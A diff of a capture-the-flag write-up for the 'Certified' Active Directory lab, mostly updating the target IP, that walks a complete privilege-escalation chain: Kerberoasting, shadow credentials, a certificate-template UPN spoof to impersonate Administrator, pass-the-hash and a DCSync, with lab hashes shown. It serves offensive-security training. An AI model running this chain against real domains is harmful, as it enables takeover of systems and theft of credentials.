@@ -53,8 +53,7 @@ Final Administrator NT hash lands the box.
 ## Recon
 
 ```bash
-nmap -p- --min-rate=5000 -oA certified 10.10.11.41
-nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sCV -oA certified-scripts 10.10.11.41
+nmap -p- -A -T4 10.129.231.186
 ```
 
 ![nmap on certified.htb](01-nmap.png)
@@ -65,7 +64,7 @@ Windows Server 2022. `/etc/hosts` update so Kerberos service tickets
 resolve to the right hostname later:
 
 ```bash
-echo "10.10.11.41 dc01.certified.htb certified.htb" | sudo tee -a /etc/hosts
+echo "10.129.231.186 dc01.certified.htb certified.htb" | sudo tee -a /etc/hosts
 ```
 
 ![/etc/hosts entry](02-etc-hosts.png)
@@ -78,7 +77,7 @@ Given credentials: **`judith.mader:judith09`** (assumed-breach start).
 
 ```bash
 bloodhound-python -u judith.mader -p judith09 -d certified.htb \
-  -c All -ns 10.10.11.41
+  -c All -ns 10.129.231.186
 ```
 
 ![bloodhound-python collect](03-bloodhound-collect.png)
@@ -126,25 +125,19 @@ python3 targetedKerberoast.py -d certified.htb -u judith.mader -p judith09
 
 ![targetedKerberoast hash for management_svc](06-kerberoast-hash.png)
 
-Hashcat, RC4 TGS-REP (`-m 13100`), rockyou, then rockyou + `best64`,
-then `rockyou-30000.rule`:
+Hashcat, RC4 TGS-REP (`-m 13100`) against rockyou:
 
 ```bash
 hashcat -m 13100 management_svc.hash /usr/share/wordlists/rockyou.txt
-hashcat -m 13100 management_svc.hash /usr/share/wordlists/rockyou.txt \
-  -r /usr/share/hashcat/rules/best64.rule
-hashcat -m 13100 management_svc.hash /usr/share/wordlists/rockyou.txt \
-  -r /usr/share/hashcat/rules/rockyou-30000.rule
 ```
 
 ![hashcat exhausted](07-hashcat-exhausted.png)
 
-**Exhausted.** No point piling more rules on — the box path is
-elsewhere and I already have a working plan through the ACL edges.
-**This is a rotation, not a failure**: on the exam clock, 15 minutes
-of dictionary attacks is the whole budget for a service-account
-password. If it does not fall to `rockyou + best64/rockyou-30000`, I
-stop and take the ACL path that is already sitting in BloodHound.
+**Exhausted.** The box path is elsewhere and I already have a working
+plan through the ACL edges. **This is a rotation, not a failure**: on
+the exam clock, a straight rockyou run is the whole budget for a
+service-account password. If it does not fall, I stop and take the
+ACL path that is already sitting in BloodHound.
 
 ---
 
@@ -228,7 +221,7 @@ hash from the TGT's PAC, and (optionally) clean up the attribute:
 certipy-ad shadow auto \
   -u judith.mader -p judith09 \
   -account management_svc \
-  -dc-ip 10.10.11.41
+  -dc-ip 10.129.231.186
 ```
 
 ![shadow credentials on management_svc](11-shadow-creds-management-svc.png)
@@ -238,7 +231,7 @@ certipy-ad shadow auto \
 Quick sanity check with `nxc`:
 
 ```bash
-nxc winrm 10.10.11.41 -u management_svc -H a091c1832bcdd4677c28b5a6a1295584
+nxc winrm 10.129.231.186 -u management_svc -H a091c1832bcdd4677c28b5a6a1295584
 ```
 
 ![nxc winrm — Pwn3d!](12-hash-check.png)
@@ -253,7 +246,7 @@ with `WBEM_E_ACCESS_DENIED`:
 
 ```bash
 impacket-wmiexec -hashes :a091c1832bcdd4677c28b5a6a1295584 \
-  certified.htb/management_svc@10.10.11.41
+  certified.htb/management_svc@10.129.231.186
 # rpc_s_access_denied / WBEM_E_ACCESS_DENIED
 ```
 
@@ -294,7 +287,7 @@ moved on. Noting it here so future-me does not lose 10 minutes on it.
 ## Step 4 — WinRM as `management_svc`, `user.txt`
 
 ```bash
-nxc winrm 10.10.11.41 -u management_svc \
+nxc winrm 10.129.231.186 -u management_svc \
   -H a091c1832bcdd4677c28b5a6a1295584 \
   -x "whoami; type C:\Users\management_svc\Desktop\user.txt"
 ```
@@ -317,7 +310,7 @@ not a fresh password to type).
 certipy-ad shadow auto \
   -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 \
   -account ca_operator \
-  -dc-ip 10.10.11.41
+  -dc-ip 10.129.231.186
 ```
 
 ![shadow credentials on ca_operator](15-shadow-creds-ca-operator.png)
@@ -338,7 +331,7 @@ there is any suggestion of a CA. Run it as `ca_operator`:
 
 ```bash
 certipy-ad find -u ca_operator -hashes :b4b86f45c6018f1b664f70805f45d8f2 \
-  -dc-ip 10.10.11.41 -vulnerable -stdout
+  -dc-ip 10.129.231.186 -vulnerable -stdout
 ```
 
 ![certipy find — templates and CA](16-certipy-find.png)
@@ -384,7 +377,7 @@ Before writing anything, current state:
 
 ```bash
 certipy-ad account read -u management_svc -hashes :a091c1832... \
-  -user ca_operator -dc-ip 10.10.11.41
+  -user ca_operator -dc-ip 10.129.231.186
 ```
 
 ![current UPN on ca_operator](18-upn-check.png)
@@ -411,7 +404,7 @@ certipy-ad account update \
   -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 \
   -user ca_operator \
   -upn administrator@certified.htb \
-  -dc-ip 10.10.11.41
+  -dc-ip 10.129.231.186
 ```
 
 ![UPN rewrite succeeds](19-upn-update.png)
@@ -437,7 +430,7 @@ certipy-ad req \
   -u ca_operator -hashes :b4b86f45c6018f1b664f70805f45d8f2 \
   -ca certified-DC01-CA \
   -template CertifiedAuthentication \
-  -dc-ip 10.10.11.41
+  -dc-ip 10.129.231.186
 ```
 
 ![certipy req produces administrator.pfx](21-certipy-req.png)
@@ -451,7 +444,7 @@ Now authenticate with the cert:
 
 ```bash
 certipy-ad auth -pfx administrator.pfx \
-  -domain certified.htb -dc-ip 10.10.11.41
+  -domain certified.htb -dc-ip 10.129.231.186
 ```
 
 This is where I hit a **certipy v5.1.0 quirk**:
@@ -471,14 +464,19 @@ certipy-ad account update \
   -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 \
   -user ca_operator \
   -upn ca_operator@certified.htb \
-  -dc-ip 10.10.11.41
+  -dc-ip 10.129.231.186
 
 # Auth with the cert requested during the spoof window
 certipy-ad auth -pfx administrator.pfx \
-  -domain certified.htb -dc-ip 10.10.11.41
+  -domain certified.htb -dc-ip 10.129.231.186
 ```
 
-![certipy auth returns Administrator NT hash](22-certipy-auth.png)
+Authenticating with the `ca_operator.pfx` (whose SAN UPN is
+`ca_operator@certified.htb`) returns `ca_operator`'s own hash — a cert
+maps strictly to whatever identity its SAN carries, which is exactly
+why the `administrator`-SAN cert is the one that matters:
+
+![certipy auth with the ca_operator cert returns ca_operator](22-certipy-auth.png)
 
 **Full disclosure:** I do not know for certain **why** certipy v5.1.0
 needed the restore step. The two candidate explanations I considered
@@ -500,7 +498,7 @@ empirical fix that unblocked the box, not as a confirmed mechanism.
 
 ```bash
 impacket-wmiexec -hashes :0d5b49608bbce1751f708748f67e2d34 \
-  certified.htb/administrator@10.10.11.41
+  certified.htb/administrator@10.129.231.186
 ```
 
 `wmiexec` works this time — as Administrator, DCOM launch/activation
@@ -519,7 +517,7 @@ Optional flex — full DCSync from the recovered credential:
 
 ```bash
 impacket-secretsdump -hashes :0d5b49608bbce1751f708748f67e2d34 \
-  certified.htb/administrator@10.10.11.41
+  certified.htb/administrator@10.129.231.186
 ```
 
 ---
